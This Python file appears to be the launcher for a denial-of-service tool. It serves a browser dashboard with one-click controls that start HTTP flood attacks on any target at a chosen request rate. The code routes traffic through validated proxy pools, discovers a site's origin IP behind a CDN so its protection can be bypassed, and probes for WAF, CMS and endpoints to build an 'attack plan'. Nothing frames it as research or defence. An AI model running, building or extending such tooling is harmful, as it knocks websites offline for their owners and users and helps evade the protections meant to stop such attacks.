#!/usr/bin/env python3
"""
Multi-Protocol Concurrency Layer - Dashboard + Attack Orchestrator
Colorful realtime dashboard with one-click attack controls.
"""
import asyncio
import argparse
import logging
import time
from typing import Optional, Dict, Any
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(name)s: %(message)s'
)
logger = logging.getLogger("launcher")


# Global state for control commands
_state = {
    "running_task": None,
    "proxy_pool": None,
    "current_target": None,
    "current_method": None,
    "accumulated": {"total": 0, "completed": 0, "failed": 0, "timeout": 0},
    "start_time": None,
    "dashboard": None,
}


async def stream_metrics(dashboard, args, attack_metrics_fn):
    """Background task: stream metrics every chunk_seconds."""
    from core.monitor.dashboard import MetricsSnapshot

    chunk_seconds = max(1, args.chunk_seconds)
    while _state["running_task"] is not None:
        await asyncio.sleep(chunk_seconds)
        result = attack_metrics_fn()
        if not result:
            continue
        elapsed = time.time() - _state["start_time"]
        chunk_rps = _state["accumulated"]["completed"] / max(elapsed, 1)
        error_rate = _state["accumulated"]["failed"] / max(_state["accumulated"]["total"], 1)
        health = max(0, min(1, (1 - error_rate) * (chunk_rps / max(args.rps, 1))))

        snap = MetricsSnapshot(
            timestamp=time.time(),
            rps=chunk_rps,
            latency_ms=0,
            error_rate=error_rate,
            health_score=health,
            adaptive_state="ATTACKING" if _state["running_task"] else "IDLE",
            adaptive_strategy="aggressive",
            total_requests=_state["accumulated"]["total"],
            completed=_state["accumulated"]["completed"],
            failed=_state["accumulated"]["failed"],
            timeout=_state["accumulated"]["timeout"],
            method=_state["current_method"] or "--",
            target=_state["current_target"] or "--",
        )
        await dashboard.broadcast_metrics(snap)


async def run_attack_cmd(target: str, method: str, duration: int, rps: int, dashboard, args):
    """Run attack and stream metrics chunks."""
    from core.attack.engines.enhanced import run_enhanced_attack
    from core.monitor.dashboard import MetricsSnapshot

    if not target.startswith(("http://", "https://", "ws://", "wss://")):
        target = "https://" + target

    _state["current_target"] = target
    _state["current_method"] = method
    _state["accumulated"] = {"total": 0, "completed": 0, "failed": 0, "timeout": 0}
    _state["start_time"] = time.time()

    await dashboard.broadcast_event("ATTACK_START", "DASHBOARD", f"{method.upper()} -> {target}", "OK")

    chunk_seconds = max(1, args.chunk_seconds)
    num_chunks = max(1, duration // chunk_seconds)
    chunk_duration = duration / num_chunks

    for chunk_idx in range(num_chunks):
        if _state["running_task"] is None:
            await dashboard.broadcast_event("ATTACK_STOP", "USER", "MANUAL_STOP", "OK")
            break

        chunk_start = time.time()
        result = await run_enhanced_attack(
            url=target,
            duration=chunk_duration,
            method=method,
            rps=rps,
            proxy=None,
            proxy_pool=_state["proxy_pool"],
            proxy_type="datacenter",
            origin_ip=None,
        )

        for k in _state["accumulated"]:
            _state["accumulated"][k] += result.get(k, 0)

        elapsed = time.time() - _state["start_time"]
        chunk_elapsed = time.time() - chunk_start
        chunk_rps = result.get("completed", 0) / max(chunk_elapsed, 1)
        error_rate = result.get("failed", 0) / max(result.get("total", 1), 1)
        health = max(0, min(1, (1 - error_rate) * (chunk_rps / max(rps, 1))))

        snap = MetricsSnapshot(
            timestamp=time.time(),
            rps=chunk_rps,
            latency_ms=chunk_elapsed * 1000 / max(result.get("total", 1), 1),
            error_rate=error_rate,
            health_score=health,
            adaptive_state="ATTACKING",
            adaptive_strategy="aggressive",
            total_requests=_state["accumulated"]["total"],
            completed=_state["accumulated"]["completed"],
            failed=_state["accumulated"]["failed"],
            timeout=_state["accumulated"]["timeout"],
            method=method,
            target=target,
        )
        await dashboard.broadcast_metrics(snap)

        if error_rate > 0.5:
            await dashboard.broadcast_event("HIGH_ERROR_RATE", "MONITOR", f"err={error_rate:.1%}", "PENDING")

        logger.info(
            f"[{chunk_idx+1}/{num_chunks}] RPS: {chunk_rps:.1f} | "
            f"OK: {_state['accumulated']['completed']} | Fail: {_state['accumulated']['failed']} | Health: {health:.2f}"
        )

    total_elapsed = time.time() - _state["start_time"]
    avg_rps = _state["accumulated"]["completed"] / max(total_elapsed, 1)
    await dashboard.broadcast_event("ATTACK_COMPLETE", "ENGINE", f"avg_rps={avg_rps:.1f}", "RESOLVED")
    _state["running_task"] = None


async def run_seo_scan(target: str, dashboard) -> Dict[str, Any]:
    """[Menu 1] SEO Scan - Endpoints, CMS, WAF, sitemap."""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    await dashboard.broadcast_event("SEO_SCAN", "DASHBOARD", target, "OK")
    try:
        from core.recon.intel.intel import TargetAnalyzer
        from core.recon.analysis.endpoint import SmartEndpointDiscovery
        ta = TargetAnalyzer()
        prof = ta.analyze(target)
        sd = SmartEndpointDiscovery()
        endps = await sd.probe(target)
        plan = sd.generate_attack_plan()
        ok = sum(1 for e in endps if e.status == 200)
        result = {
            "target": target, "cms": prof.cms, "waf": prof.waf, "ip": prof.ip,
            "behind_cdn": prof.is_behind_cdn,
            "endpoints": len(endps), "accessible": ok, "vectors": len(plan)
        }
        await dashboard.broadcast_event("SEO_SCAN_DONE", target, f"{ok}/{len(endps)} accessible", "RESOLVED")
        return result
    except Exception as e:
        await dashboard.broadcast_event("SEO_SCAN_FAIL", target, str(e)[:50], "ERROR")
        return {"error": str(e)}


async def run_find_origin(target: str, dashboard) -> Dict[str, Any]:
    """[Menu 6] Find Origin IP."""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    await dashboard.broadcast_event("FIND_ORIGIN", "DASHBOARD", target, "OK")
    try:
        from core.recon.origin.origin_finder import OriginFinder
        finder = OriginFinder()
        report = finder.find_origin(target)
        result = {
            "target": target,
            "verified_origin": report.verified_origin,
            "candidates": [{"ip": c.ip, "confidence": c.confidence} for c in report.candidates[:5]],
        }
        status = "RESOLVED" if report.verified_origin else "MONITORING"
        await dashboard.broadcast_event("FIND_ORIGIN_DONE", target,
                                        report.verified_origin or f"{len(report.candidates)} candidates", status)
        return result
    except Exception as e:
        await dashboard.broadcast_event("FIND_ORIGIN_FAIL", target, str(e)[:50], "ERROR")
        return {"error": str(e)}


async def run_test_proxies(dashboard) -> Dict[str, Any]:
    """[Menu 5] Test Proxies."""
    await dashboard.broadcast_event("TEST_PROXIES", "DASHBOARD", "alive.txt", "OK")
    try:
        from core.network.proxy import ProxyPool
        pool = ProxyPool()
        n = await pool.load_file("proxies/alive.txt")
        if n == 0:
            return {"error": "No proxies in alive.txt"}
        alive = await pool.quick_validate(count=100, concurrency=20)
        pool.save_alive("proxies/alive.txt")
        result = {"loaded": n, "alive": alive, "stats": pool.stats()}
        await dashboard.broadcast_event("PROXY_TEST_DONE", "POOL", f"{alive}/{n} alive", "RESOLVED")
        _state["proxy_pool"] = pool
        return result
    except Exception as e:
        await dashboard.broadcast_event("PROXY_TEST_FAIL", "POOL", str(e)[:50], "ERROR")
        return {"error": str(e)}


async def command_handler(action: str, payload: Dict[str, Any], dashboard, args) -> Dict[str, Any]:
    """Handle commands from dashboard frontend."""
    target = payload.get("target", "").strip()
    method = payload.get("method", "http_get_flood")
    duration = int(payload.get("duration", 30))
    rps = int(payload.get("rps", 100))

    if action == "stop":
        if _state["running_task"]:
            _state["running_task"].cancel()
            _state["running_task"] = None
            return {"status": "stopped"}
        return {"status": "not_running"}

    if _state["running_task"] is not None:
        return {"error": "Attack already running. Stop first."}

    if action == "seo_scan":
        if not target:
            return {"error": "target required"}
        return await run_seo_scan(target, dashboard)

    if action == "test_proxies":
        return await run_test_proxies(dashboard)

    if action == "find_origin":
        if not target:
            return {"error": "target required"}
        return await run_find_origin(target, dashboard)

    if action == "seo_backheart":
        return {"info": "SEO BACKHEART module not exposed via dashboard yet, use CLI: python main.py --start"}

    if action in ("attack_direct", "attack_proxy", "attack_origin"):
        if not target:
            return {"error": "target required"}
        proxy_pool = _state["proxy_pool"] if action == "attack_proxy" else None
        if action == "attack_proxy" and not proxy_pool:
            return {"error": "Run [5] TEST PROXIES first to load proxy pool"}

        _state["proxy_pool"] = proxy_pool
        task = asyncio.create_task(run_attack_cmd(target, method, duration, rps, dashboard, args))
        _state["running_task"] = task
        return {"status": "started", "method": method, "target": target, "duration": duration, "rps": rps}

    return {"error": f"unknown action: {action}"}


async def main():
    parser = argparse.ArgumentParser(
        description="Multi-Protocol Concurrency Layer - Dashboard with One-Click Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python dashboard_launcher.py
  python dashboard_launcher.py --http-port 8090 --dashboard-port 8765

After launch, open http://localhost:8090 to control attacks via UI.
        """
    )
    parser.add_argument("--http-port", type=int, default=8090)
    parser.add_argument("--dashboard-port", type=int, default=8765)
    parser.add_argument("--chunk-seconds", type=int, default=2)
    parser.add_argument("-t", "--target", default="", help="Optional auto-start target")
    parser.add_argument("-m", "--method", default="http_get_flood")
    parser.add_argument("-d", "--duration", type=int, default=30)
    parser.add_argument("-r", "--rps", type=int, default=100)
    parser.add_argument("--no-proxy", action="store_true")
    parser.add_argument("--auto-start", action="store_true", help="Auto-launch attack on startup")

    args = parser.parse_args()

    # Pre-flight: check ports are free (8080 often used by Laragon/Apache)
    import socket as _sock
    def _port_free(port: int) -> bool:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        try:
            s.bind(("127.0.0.1", port))
            return True
        except OSError:
            return False
        finally:
            s.close()

    for p, name in [(args.http_port, "HTTP"), (args.dashboard_port, "WebSocket")]:
        if not _port_free(p):
            logger.error("=" * 60)
            logger.error(f"  PORT {p} ({name}) IS ALREADY IN USE")
            logger.error(f"  Likely culprits: Laragon, Apache, Nginx, another instance.")
            logger.error(f"  Fix: pick a different port, e.g.:")
            logger.error(f"    python dashboard_launcher.py --http-port 9000 --dashboard-port 9001")
            logger.error("=" * 60)
            return

    from core.monitor.dashboard import DashboardServer, MetricsSnapshot, DASHBOARD_HTML
    from aiohttp import web

    logger.info("=" * 60)
    logger.info("Multi-Protocol Concurrency Layer - Attack Dashboard")
    logger.info("=" * 60)

    # Patch HTML with WS port
    html_content = DASHBOARD_HTML.replace("__WS_PORT__", str(args.dashboard_port))

    # Start WS server
    dashboard = DashboardServer(host="0.0.0.0", port=args.dashboard_port)

    async def cmd_handler(action, payload):
        return await command_handler(action, payload, dashboard, args)

    dashboard.set_command_handler(cmd_handler)
    _state["dashboard"] = dashboard
    dashboard_task = asyncio.create_task(dashboard.start())
    await asyncio.sleep(1.0)  # ensure WS is listening before HTTP page tries to connect

    # Start HTTP server
    async def http_handler(request):
        return web.Response(text=html_content, content_type="text/html")

    async def health_handler(request):
        return web.json_response({"status": "ok", "version": "1.0"})

    app = web.Application()
    app.router.add_get("/", http_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", args.http_port)
    await site.start()

    logger.info("")
    logger.info(f"  >> DASHBOARD READY")
    logger.info(f"  >> Open in browser: http://localhost:{args.http_port}")
    logger.info(f"  >> WebSocket:       ws://localhost:{args.dashboard_port}")
    logger.info("")

    # Idle metrics broadcast
    from core.monitor.dashboard import MetricsSnapshot
    async def idle_loop():
        while True:
            await asyncio.sleep(args.chunk_seconds)
            if _state["running_task"]:
                continue
            snap = MetricsSnapshot(
                timestamp=time.time(),
                rps=0, latency_ms=0, error_rate=0, health_score=1.0,
                adaptive_state="IDLE", adaptive_strategy="none",
                total_requests=0, completed=0, failed=0, timeout=0,
                method="--", target="--",
            )
            await dashboard.broadcast_metrics(snap)
    idle_task = asyncio.create_task(idle_loop())

    # Auto-start attack if requested
    if args.auto_start and args.target:
        logger.info(f"Auto-starting: {args.method} -> {args.target}")
        task = asyncio.create_task(run_attack_cmd(args.target, args.method, args.duration, args.rps, dashboard, args))
        _state["running_task"] = task

    try:
        # Keep running
        while True:
            await asyncio.sleep(60)
    except (KeyboardInterrupt, asyncio.CancelledError):
        logger.info("Shutting down...")
    finally:
        if _state["running_task"]:
            _state["running_task"].cancel()
        idle_task.cancel()
        await dashboard.stop()
        await runner.cleanup()
        dashboard_task.cancel()
        logger.info("Shutdown complete")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
